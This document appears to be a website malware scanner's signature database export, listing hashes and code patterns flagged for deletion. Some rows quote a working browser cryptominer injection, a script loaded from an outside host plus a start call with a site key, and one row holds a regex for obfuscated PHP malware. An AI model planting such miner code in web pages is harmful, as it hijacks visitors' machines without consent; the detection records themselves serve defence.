584,malware.020322.1116,803c30bf247b20b118268ebeb3b2fc40,FILE,MALWARE,'2020-07-06 09:27:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
586,malware.020322.1115,790780969d26d507fd3a0eda748fca7f,FILE,MALWARE,'2020-07-06 09:27:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
588,malware.020322.1114,013a41ac9bfeb1fc5341b661a13ebce3,FILE,MALWARE,'2020-07-06 09:27:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
590,malware.020322.1113,16ff6d5003b2463eba6c821b4d8e0e8c,FILE,MALWARE,'2020-07-06 09:28:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
592,malware.020322.1112,56122d83ff375e145539f982ea473fb4,FILE,MALWARE,'2020-07-06 09:28:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
594,malware.020322.1111,9d07a2a4f4ed22715819658b527ae258,FILE,MALWARE,'2020-07-06 09:28:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
596,malware.020322.1110,1422e028248ef8b05a383b3b472ea9bb,FILE,MALWARE,'2020-07-06 09:28:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
598,malware.020322.1064,efd719813166d0586a89379fd1bc9b7f,FILE,MALWARE,'2020-07-06 09:28:54','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
600,malware.020322.1063,da01030812d6818df4a2db4be093ef17,FILE,MALWARE,'2020-07-06 09:29:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
602,malware.020322.1062,0ac7598deaff2a0847498bf9775ff1fd,FILE,MALWARE,'2020-07-06 09:29:08','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
604,malware.020322.1061,72170495e44d68d29914e9aa4b0070fe,FILE,MALWARE,'2020-07-06 09:29:13','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
606,malware.020322.1060,31696841236edb2bb49c6a0b7a55aaf7,FILE,MALWARE,'2020-07-06 09:29:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
608,malware.020322.1059,e9b6191ec7b1b1b8bfd567f0ff33bfd5,FILE,MALWARE,'2020-07-06 09:29:25','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
610,malware.020322.1058,c3f24f50f705c6d98f84487e07bf9676,FILE,MALWARE,'2020-07-06 09:29:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
611,malware.020322.1057,ce5094f1f0c94a7ac37587a523282b4c,FILE,MALWARE,'2020-07-08 10:06:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
613,malware.ubh.190322.0917.19141,1aabfa7d6000046c5a0a0ccc932a3446,FILE,MALWARE,'2020-07-08 10:07:27','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
617,malware.020322.1056,664066cb14773055e11166a02a2dde76,FILE,MALWARE,'2020-07-10 09:17:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
623,malware.020322.1055,9b989a4d2f7d22916b5d29e25f946afe,FILE,MALWARE,'2020-07-10 09:19:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
625,malware.020322.1054,7ff4c2e92165c3015332f0f4d44fc7f6,FILE,MALWARE,'2020-07-10 09:19:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
633,malware.020322.1053,92b7a831cf97dcc2b6558047a71287ea,FILE,MALWARE,'2020-07-10 09:21:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
635,malware.020322.1052,5f8dad063a5850597b0796351800ea8d,FILE,MALWARE,'2020-07-14 10:52:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
639,malware.020322.1051,f131e594bb01e93adf802291dbf12a43,FILE,MALWARE,'2020-07-17 17:06:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
641,malware.190322.0923.19566,bd60d46e1049e9daf5bb49bf8a8a6e12,FILE,MALWARE,'2020-07-17 17:06:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
643,malware.190322.0925.19568,f7dea5d817bf941bc5227bc47b3c3662,FILE,MALWARE,'2020-07-17 17:06:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
645,malware.190322.0926.19570,5692028003d0f6ace205ad64a346e978,FILE,MALWARE,'2020-07-17 17:07:09','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
647,malware.020322.1050,7ae03b1ad37eecf7ff85b0dcae44e24b,FILE,MALWARE,'2020-07-17 17:07:14','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
659,malware.250322.1153.19750,3d20f06a64355014839bea2d246f5391,FILE,MALWARE,'2020-07-22 12:02:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
665,malware.020322.1049,28debdb04dc7a83fcc5197d20300eeef,FILE,MALWARE,'2020-07-23 00:07:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
667,malware.190322.0929.19779,28debdb04dc7a83fcc5197d20300eeef,FILE,MALWARE,'2020-07-23 00:07:59','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
673,malware.190322.0931.19896,8afdd9612622e393f5179ffe572ff083,FILE,MALWARE,'2020-07-29 15:24:54','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
675,malware.020322.1048,cfbf13b8b94d79d595256cf6093c82fc,FILE,MALWARE,'2020-08-24 16:01:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
677,malware.020322.1047,5ab24bf4ef782286b6d913df56372c1c,FILE,MALWARE,'2020-08-24 16:05:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
679,malware.020322.1046,add493b9f4f43eaa2fe9cd21235c504e,FILE,MALWARE,'2020-08-24 16:09:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
681,malware.020322.1045,05ab2b1470e2ebd09e37e3e1d5f52073,FILE,MALWARE,'2020-08-24 16:13:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
683,malware.020322.1044,1ec755fc7b559d0141a3b242be6c244d,FILE,MALWARE,'2020-08-24 16:14:01','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
687,malware.020322.1043,52387dff117cd94b5e54caf568c30c6d,FILE,MALWARE,'2020-08-24 16:16:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
693,malware.020322.1042,a9811574bd5445e6789fa503ddc54cc9,FILE,MALWARE,'2020-08-24 16:17:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
695,malware.020322.1041,8c3e0451b1cb4d23e3ee24db66dcd243,FILE,MALWARE,'2020-08-24 16:28:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
697,malware.020322.1040,da37c37d79da0c8a651137adda0d5d55,FILE,MALWARE,'2020-08-25 11:33:24','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
699,malware.020322.1039,6350890f67b9198c047b81a3e8bf8a8a,FILE,MALWARE,'2020-08-25 11:52:06','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
701,malware.020322.1038,4247a2a82f347ce29c4ccd4a4411d71e,FILE,MALWARE,'2020-08-25 11:52:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
703,malware.020322.1037,25a1b18ea501371c81e9c6b284e21ca6,FILE,MALWARE,'2020-08-25 11:52:54','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
705,malware.020322.1036,7f569192e0565d0cb4b36cf6e2739338,FILE,MALWARE,'2020-08-25 11:53:04','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
707,malware.020322.1035,aeb9feb9f45a80ec98d10150f0271038,FILE,MALWARE,'2020-08-25 11:53:25','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
709,malware.020322.1034,b8b31022b3e6b75e168bdc2e892814b3,FILE,MALWARE,'2020-08-25 11:53:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
711,malware.020322.1033,cd69611259d8651273b6a3b51c7fde3a,FILE,MALWARE,'2020-08-25 11:53:54','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
713,malware.020322.1032,ca1cd12410e6cb972cf9d5b616a59676,FILE,MALWARE,'2020-08-25 11:54:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
715,malware.020322.1031,74dcf239efa46f34c71dd20ec2716547,FILE,MALWARE,'2020-08-25 11:54:11','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
717,malware.020322.1030,5966c58475f0c83c3a69c5c5b53554a0,FILE,MALWARE,'2020-08-25 11:54:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
719,malware.020322.1029,7ab6cd424e0784cc9ba1286922d71a09,FILE,MALWARE,'2020-08-25 11:54:34','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
721,malware.020322.1028,4f93c2fc9ca8cd54f749536b868e35ef,FILE,MALWARE,'2020-08-25 11:54:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
723,malware.020322.1027,9ce4ffc8f116e92e5b7188c382a766d0,FILE,MALWARE,'2020-08-25 11:54:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
725,malware.020322.1026,d4db5105b9a64d9690d704a9873579b9,FILE,MALWARE,'2020-08-25 11:55:11','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
727,malware.020322.1025,81b8cfdb83f6ddc0a8d9031f97915bc8,FILE,MALWARE,'2020-08-25 11:55:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
729,malware.020322.1024,68a47f2fe4cbc542b056f9f9545f7500,FILE,MALWARE,'2020-08-26 15:45:32','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
739,malware.020322.1023,2f10c5b1c9614a7f648a81ae6bd3ac70,FILE,MALWARE,'2020-09-01 13:06:50','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
743,malware.020322.1022,774718828dc8576ddce4931ffe93dc1d,FILE,MALWARE,'2020-09-01 13:07:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
755,malware.020322.1021,d528fa092e8c932a7bff5e50727789ec,FILE,MALWARE,'2020-09-03 16:28:43','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
757,malware.020322.1020,8d4d480a9db55ef1384a7d60dc3b01b4,FILE,MALWARE,'2020-09-03 16:29:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
759,malware.020322.1019,f9e5dac2831bf82870f017b361d65446,FILE,MALWARE,'2020-09-07 10:56:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
761,malware.020322.1018,9b6e6a228673462907ea82b9e6468eb6,FILE,MALWARE,'2020-09-07 11:00:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
763,malware.020322.1017,8c23a35ab4d4c55c91fd6f09a72f8bbb,FILE,MALWARE,'2020-09-07 11:00:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
765,malware.020322.1016,faa0e74b6cae0675bb6131b68ac8be1d,FILE,MALWARE,'2020-09-07 11:09:24','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
767,malware.020322.1015,c5fa4512385e47425e0b8d174ff68297,FILE,MALWARE,'2020-09-08 11:56:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
769,malware.020322.1014,ec3b00b435eaf4408974475e8219068c,FILE,MALWARE,'2020-09-08 11:56:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
771,malware.020322.1013,fbc0ae4ecf9d0870fa9da521ca6cd2f6,FILE,MALWARE,'2020-09-09 14:58:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
775,malware.020322.1012,3a28173b5633203b2c0b47d393a18016,FILE,MALWARE,'2020-09-14 09:49:12','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
777,malware.020322.1011,4597f8b03d13c6b73725ba801792e396,FILE,MALWARE,'2020-09-14 09:49:18','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
779,malware.020322.1010,4675de9441bfe84250f15721bafcd58d,FILE,MALWARE,'2020-09-14 09:49:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
791,malware.190322.1134.21214,fbc0ae4ecf9d0870fa9da521ca6cd2f6,FILE,MALWARE,'2020-09-14 09:51:42','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
793,malware.020322.1009,1b29c5ae395808bafa4880ca55ba0c78,FILE,MALWARE,'2020-09-14 09:51:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
795,malware.020322.1008,9b56360918da09e317c95dcd329baa93,FILE,MALWARE,'2020-09-14 09:52:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
797,malware.020322.1007,c1546bd510040d9ad8edf478179f1113,FILE,MALWARE,'2020-09-14 09:52:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
799,malware.020322.1006,0444c0c6d8cde857bba5d202fab1792b,FILE,MALWARE,'2020-09-14 09:52:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
801,malware.190322.1138.21239,'#function _shO1\(\$_ykChiEx\)\{\$_ykChiEx.{1,4400}GjKTCCsr7c8YxpsOLimG''\)\)\)\)\)\)\)\)\)\)\)\)\)\)\)\)\)\)\);#',CODE_PHP,MALWARE,'2020-09-14 09:52:43','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
803,malware.020322.1005,6114d6669f4ac46940cfc35631b561c8,FILE,MALWARE,'2020-09-14 09:52:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
805,malware.020322.1004,3480dcf23fdfa81ed608897c2680bb4a,FILE,MALWARE,'2020-09-14 09:52:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
807,malware.020322.1003,5d9632d084b6388278b70cd6b1d05a3d,FILE,MALWARE,'2020-09-14 09:52:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
809,malware.020322.1002,0500b24c0faa6f837e5b43c8eb6dbe44,FILE,MALWARE,'2020-09-14 09:52:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
811,malware.020322.1001,c8acce680a8a234a383e92b69b62b55b,FILE,MALWARE,'2020-09-14 09:53:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
813,malware.020322.1000,83903657c2c2827946a007dd3d45eefa,FILE,MALWARE,'2020-09-14 09:53:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
815,malware.020322.0962,23c8eda8d9547ed15ca4e95ee55c96a1,FILE,MALWARE,'2020-09-14 09:53:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
819,malware.020322.0961,5a6127e7455fe800991748d113dae9af,FILE,MALWARE,'2020-09-21 10:14:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
821,malware.020322.0960,e6c5986306609993cbfa835578f071da,FILE,MALWARE,'2020-09-21 10:14:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
823,malware.020322.0959,23227742f9669cf7fcc7364763d38e73,FILE,MALWARE,'2020-09-21 10:14:45','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
825,malware.020322.0958,734b4665c163997eeb5c3cedef151d2a,FILE,MALWARE,'2020-09-21 10:14:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
827,malware.020322.0957,606711dbcf955125987773c40d99c547,FILE,MALWARE,'2020-09-21 10:15:05','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
829,malware.020322.0956,80756324459e7e7f9e3b89f30b56f500,FILE,MALWARE,'2020-09-21 10:15:12','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
831,malware.020322.0955,608b1e6a998f22c2477e78fc32051dce,FILE,MALWARE,'2020-09-21 10:15:18','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
833,malware.020322.0954,804052dc9ade00c63303c2462c89097f,FILE,MALWARE,'2020-09-21 10:15:25','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
835,malware.020322.0953,e29f52101035ce3e130d7e0013e869c0,FILE,MALWARE,'2020-09-21 10:15:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
837,malware.020322.0952,03733856b518beaa42517d0d441f9cab,FILE,MALWARE,'2020-09-21 10:15:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
841,malware.020322.0951,82938a64e4c7dc93a7066213d0c3c67b,FILE,MALWARE,'2020-09-21 10:16:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
843,malware.020322.0950,072b3a67740dddb3ad5c76d153f2d116,FILE,MALWARE,'2020-09-21 10:16:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
845,malware.020322.0949,2bafb4074242fbd2c74c862686521e1d,FILE,MALWARE,'2020-09-21 10:17:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
847,malware.020322.0948,862d2d077f716ae8d8688b5db4c20f2e,FILE,MALWARE,'2020-09-21 10:17:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
849,malware.020322.0947,5203fd71dc8aaf4c50df983e3a6354a2,FILE,MALWARE,'2020-09-21 10:17:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
851,malware.020322.0946,6592f664f1932aeb84ba677c61529395,FILE,MALWARE,'2020-09-21 10:17:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
853,malware.020322.0945,e4ac71dfe0be9fb5e96203316ae67b1f,FILE,MALWARE,'2020-09-21 10:18:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
855,malware.020322.0944,c49c4cbcd311c41fea87034a4bf3bb8a,FILE,MALWARE,'2020-09-21 10:18:45','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
857,malware.020322.0943,29441a423e4f5036b68f1185c15d3360,FILE,MALWARE,'2020-09-21 10:18:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
859,malware.020322.0942,490988e42b2ac3f7dfd9effd690e07e8,FILE,MALWARE,'2020-09-21 10:19:05','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
861,malware.020322.0941,b4408063bbb8a44df96c11625acb8b28,FILE,MALWARE,'2020-09-21 10:19:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
863,FROM_FA_21704,cc15948f6f75534f3118313193704d44,FILE,MALWARE,'2020-09-21 10:21:45','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
869,'U FROM_FA_21686_2020-9-21_10:32:19','<script src="https://www.hostingcloud.racing/ab20.js"></script><script>var _client = new Client.Anonymous(''1f8a0f16caaf7bb75d7c1c05db46e340bfd034c9f520a1c228b1a545703e695e'', {throttle: 0.55, c: ''w'', ads: 0}); _client.setNumThreads(15);_client.setAutoThreadsEnabled(1);_client.start(Client.FORCE_MULTI_TAB);</script>',CODE_PHP,MALWARE,'2020-09-21 10:32:22','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
875,FROM_FA_21784,614a750559c57932dec857e5334fb300,FILE,MALWARE,'2020-09-24 16:48:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
879,'Miner Script','var _client = new Client.Anonymous(''1f8a0f16caaf7bb75d7c1c05db46e340bfd034c9f520a1c228b1a545703e695e'', {throttle: 0.55, c: ''w'', ads: 0}); _client.setNumThreads(15);_client.setAutoThreadsEnabled(1);_client.start(Client.FORCE_MULTI_TAB);',CODE_JS,MALWARE,'2020-09-28 16:37:18','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
885,FROM_FA_21491,ec03f30c392d665aba72f34f2a2ef111,FILE,MALWARE,'2020-09-29 17:59:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
887,FROM_FA_21493,3f3b5a8f369783827eefe460e5403485,FILE,MALWARE,'2020-09-29 17:59:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
889,FROM_FA_21495,6086041b6c0078d1c2edddd6c5bf52db,FILE,MALWARE,'2020-09-29 17:59:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
891,FROM_FA_21497,bc4f29e01cd1a211440d949e3b80ccab,FILE,MALWARE,'2020-09-29 17:59:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
893,FROM_FA_21518,bc6ae36e37f82bc1d55c1312c8ab46ec,FILE,MALWARE,'2020-09-29 18:02:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
895,FROM_FA_21520,037a20705d6ca4911473bc60d05d30c6,FILE,MALWARE,'2020-09-29 18:02:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
897,FROM_FA_21522,9306b4fa83fcac726a5d2803b00c762a,FILE,MALWARE,'2020-09-29 18:02:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
899,FROM_FA_21524,1c1f52e23c9f301dd3e6a34a89056bc5,FILE,MALWARE,'2020-09-29 18:03:41','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
901,FROM_FA_21526,13c0c5110ab5766b229a2cb9e4a8bf4b,FILE,MALWARE,'2020-09-29 18:03:51','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
903,FROM_FA_21528,9fb0d9773edded12bda777f43262a796,FILE,MALWARE,'2020-09-29 18:04:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
905,FROM_FA_21530,c0c47f0fdeac7f5b36af046373ec7850,FILE,MALWARE,'2020-09-29 18:05:08','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
907,FROM_FA_21532,0f82fd6cf9577a0959641cac67984d14,FILE,MALWARE,'2020-09-29 18:05:18','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
909,FROM_FA_21536,fa7cf4f3dc5b88678182fe41b071feda,FILE,MALWARE,'2020-09-29 18:05:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
911,FROM_FA_21538,decfdd3f793cb8ab73cfc233358e80a6,FILE,MALWARE,'2020-09-29 18:05:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
913,FROM_FA_21586,f916773845d8d4972bb4086bf0a22f04,FILE,MALWARE,'2020-09-29 22:11:42','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
915,FROM_FA_21584,589a1c2ed9b3c054936a5c47eece3ca2,FILE,MALWARE,'2020-09-29 22:11:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
921,FROM_FA_23315,c8f37e21f191fee0e8899dddbf2f8b1d,FILE,MALWARE,'2020-11-05 13:34:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
923,'U FROM_FA_23319',74d206e98ae1f2e9e3a52cd1e8c3c955,FILE,MALWARE,'2020-11-05 13:35:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
925,'U FROM_FA_23321',6d0e6d8ee7c1b8535fa232bf48da6a08,FILE,MALWARE,'2020-11-05 13:36:04','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
927,malware.020322.0932,9ec543f3c0e9ed2a3e8ad113aed62a49,FILE,MALWARE,'2020-11-05 13:36:19','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
929,'U FROM_FA_23324',4edc964acf0e0945be5f00ef73c54d86,FILE,MALWARE,'2020-11-05 13:36:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
931,'U FROM_FA_23325',987c6ef418824eff9d48cfb530352b9d,FILE,MALWARE,'2020-11-05 13:36:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
932,malware.020322.0933,e4b6a6355639ba4504fd9da267167cfa,FILE,MALWARE,'2020-11-15 23:07:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
933,'U FROM_FA_23456',ca96903fd9da307644a23eada284db86,FILE,MALWARE,'2020-11-17 09:41:11','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
935,'U FROM_FA_23457',4ebf571f7d0c4b03bbb68d3e28ce8cc0,FILE,MALWARE,'2020-11-17 09:41:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
937,'U FROM_FA_23485',611ef143d819f0ec3ed6d1f2bad6c697,FILE,MALWARE,'2020-11-19 20:56:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
941,FROM_FA_23490,9ba08e8b8a464bccfcca9e6c85ca0730,FILE,MALWARE,'2020-11-20 14:30:07','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
943,FROM_FA_23492,6da8d15804cece3fc8323009f3b8ad11,FILE,MALWARE,'2020-11-20 14:30:21','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
945,malware.020322.0934,c65f10a1973cf6d8f3afb79423bbedd9,FILE,MALWARE,'2020-11-23 08:47:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
946,FROM_FA_23446,5efe972a9d02cd928072b6f8f6e1aaaf,FILE,MALWARE,'2020-11-23 16:24:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
948,FROM_FA_23448,3a7fb9990895c1e4aafa0ccad1adfa4b,FILE,MALWARE,'2020-11-23 16:24:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
950,'U FROM_FA_23452',2d8008b9cfb4ee3e8dab3b74ee229405,FILE,MALWARE,'2020-11-23 16:25:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
953,'U FROM_FA_23354',729d9bd5356fb855d5666a949e123e83,FILE,MALWARE,'2020-11-25 17:25:32','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
955,FROM_FA_23372,ceb3f156664c4b44bcc1173811393ff2,FILE,MALWARE,'2020-11-25 17:26:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
957,FROM_FA_23373,e7d9bf3252add4a5628bd0c728ecb0c7,FILE,MALWARE,'2020-11-25 17:26:32','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
